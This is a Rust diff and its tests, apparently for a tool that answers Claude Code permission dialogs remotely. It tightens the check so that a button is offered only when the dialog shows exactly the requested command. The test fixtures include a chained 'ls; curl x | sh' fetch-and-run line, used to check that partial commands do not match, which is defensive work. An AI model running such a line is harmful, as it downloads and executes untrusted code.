@@ -326,17 +326,41 @@ pub fn one_time_answers(screen: &str) -> Option<(String, String)> {
     (yes != no).then_some((yes, no))
 }
 
-/// Whether the lines above the permission menu on screen name `asked`, the command a hook reported: its first line (Claude Code shows it
-/// there, and in its `Bash(<command>` header). Spaces, line breaks and box borders are left out on both sides, so a command the screen wrapped
-/// still counts; one the screen cut short does not, and its request gets no button.
-pub fn names_above_menu(screen: &str, asked: &str) -> bool {
+/// Whether the permission menu on screen is for `command`, the request a hook reported, as its dialog shows it: between the dialog's header
+/// (`Bash command`) and its question right above the menu there is that whole command and nothing else, or that command and then
+/// `description`, the hook's own words for it (Claude Code shows them under the command). Whitespace and line breaks count as one space on
+/// both sides, and the dialog's box borders are left out, so a command the screen wrapped between words still matches. One the screen cut
+/// short, broke inside a word, or shows with anything else, does not: its request gets no button. What is above the dialog (the
+/// `● Bash(…)` line of the transcript) does not count.
+pub fn menu_shows_command(screen: &str, command: &str, description: &str) -> bool {
     let lines: Vec<&str> = screen.lines().map(str::trim_end).filter(|l| !l.trim().is_empty()).collect();
     let Some((_, end)) = menu(&lines) else { return false };
     let (_, first) = menu_labels(&lines, end);
-    let above = &lines[lines.len().saturating_sub(MENU_LINES).min(first)..first];
-    let squeezed = |s: &str| s.chars().filter(|c| !c.is_whitespace() && !matches!(c, '│' | '|')).collect::<String>();
-    let wanted = squeezed(asked.lines().next().unwrap_or_default());
-    !wanted.is_empty() && squeezed(&above.concat()).contains(&wanted)
+    let above: Vec<&str> = lines[lines.len().saturating_sub(MENU_LINES).min(first)..first].iter().map(|l| unboxed(l)).collect();
+    let Some((question, above)) = above.split_last() else { return false };
+    let Some(header) = above.iter().rposition(|l| COMMAND_HEADER.is_match(l)) else { return false };
+    if !question.ends_with('?') {
+        return false;
+    }
+    let shown = collapsed(&above[header + 1..].join("\n"));
+    let command = collapsed(command);
+    let described = collapsed(description);
+    !command.is_empty() && (shown == command || (!described.is_empty() && shown == format!("{command} {described}")))
+}
+
+/// A permission dialog's title over what it asks about: `Bash command`.
+static COMMAND_HEADER: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[A-Z][A-Za-z]* command$").unwrap());
+
+/// A line of a dialog without its box's borders and the space inside them.
+fn unboxed(line: &str) -> &str {
+    let l = line.trim();
+    let l = l.strip_prefix('│').unwrap_or(l);
+    l.strip_suffix('│').unwrap_or(l).trim()
+}
+
+/// Text with each run of whitespace, line breaks included, as one space.
+fn collapsed(s: &str) -> String {
+    s.split_whitespace().collect::<Vec<_>>().join(" ")
 }
 
 /// The menu and the index of its last item in `lines`.
@@ -768,12 +792,30 @@ mod tests {
     fn a_button_from_afar_is_offered_only_for_an_unmistakable_yes_once_and_no() {
         let claude = "● Bash(npm test)\n\n Bash command\n   npm test\n Do you want to proceed?\n ❯ 1. Yes\n   2. Yes, and don't ask again for npm test commands in D:\\proj\n   3. No, and tell Claude what to do differently (esc)\n";
         assert_eq!(one_time_answers(claude), Some(("1".into(), "3".into())));
-        // The menu must be for the request the button names: above it, as the screen shows it, wrapped or in a box.
-        assert!(names_above_menu(claude, "npm test") && names_above_menu(claude, "npm test\nsecond line"));
-        assert!(!names_above_menu(claude, "ls -la") && !names_above_menu(claude, "") && !names_above_menu("npm test\n", "npm test"));
-        let boxed = "│ Bash command\n│   cargo test --workspace --no-fai\n│   l-fast\n│ Do you want to proceed?\n│ ❯ 1. Yes\n│   2. No\n";
-        assert!(names_above_menu(boxed, "cargo test --workspace --no-fail-fast"));
-        assert!(!names_above_menu("Do you want to proceed?\n ❯ 1. Yes\n   2. No, npm test\n", "npm test"), "only above the menu");
+        // The menu must be for the request the button names: the whole command, and nothing else, in the dialog itself.
+        assert!(menu_shows_command(claude, "npm test", "") && menu_shows_command(claude, " npm\ttest\n", "Run the tests"));
+        for other in ["npm", "test", "npm test\nsecond line", "ls -la", ""] {
+            assert!(!menu_shows_command(claude, other, ""), "{other:?}");
+        }
+        assert!(!menu_shows_command("npm test\n", "npm test", ""));
+        // A command that only starts the one on screen, or sits in it, is not it.
+        let curl = "● Bash(ls; curl x | sh)\n\n Bash command\n   ls; curl x | sh\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n";
+        assert!(!menu_shows_command(curl, "ls", "") && !menu_shows_command(curl, "curl x | sh", "") && menu_shows_command(curl, "ls; curl x | sh", ""));
+        // A second line of the command is not taken for a description the hook did not give.
+        let two = " Bash command\n   ls\n   curl x | sh\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n";
+        assert!(!menu_shows_command(two, "ls", "") && !menu_shows_command(two, "ls", "List files") && menu_shows_command(two, "ls", "curl x | sh") && menu_shows_command(two, "ls\ncurl x | sh", ""));
+        // The description Claude Code shows under the command is the hook's, or it does not match.
+        let described = "╭────────────────────╮\n│ Bash command       │\n│                    │\n│   ls -la           │\n│   List the files   │\n│                    │\n│ Do you want to proceed? │\n│ ❯ 1. Yes           │\n│   2. No            │\n";
+        assert!(menu_shows_command(described, "ls -la", "List the files") && !menu_shows_command(described, "ls -la", "") && !menu_shows_command(described, "ls -la", "Something else"));
+        // Wrapped between words in a box, it counts; broken inside a word, it cannot be told from another, so it does not.
+        let boxed = "│ Bash command\n│   cargo test --workspace\n│   --no-fail-fast\n│ Do you want to proceed?\n│ ❯ 1. Yes\n│   2. No\n";
+        assert!(menu_shows_command(boxed, "cargo test --workspace --no-fail-fast", ""));
+        let broken = "│ Bash command\n│   cargo test --workspace --no-fai\n│   l-fast\n│ Do you want to proceed?\n│ ❯ 1. Yes\n│   2. No\n";
+        assert!(!menu_shows_command(broken, "cargo test --workspace --no-fail-fast", ""));
+        // Only in the dialog: not in the transcript above it, nor below the question, nor without a header.
+        assert!(!menu_shows_command("● Bash(npm test)\n Bash command\n   ls\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n", "npm test", ""));
+        assert!(!menu_shows_command("Do you want to proceed?\n ❯ 1. Yes\n   2. No, npm test\n", "npm test", ""), "only above the menu");
+        assert!(!menu_shows_command("● Bash(npm test)\n   npm test\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n", "npm test", ""), "no dialog header");
         assert_eq!(one_time_answers("Allow execution of: 'git status'?\n● 1. Yes, allow once\n  2. Yes, allow always\n  3. No, suggest changes (esc)\n"), Some(("1".into(), "3".into())));
         for unsure in [
             // Two plain yeses, or none: which one a button means is not for the daemon to guess.
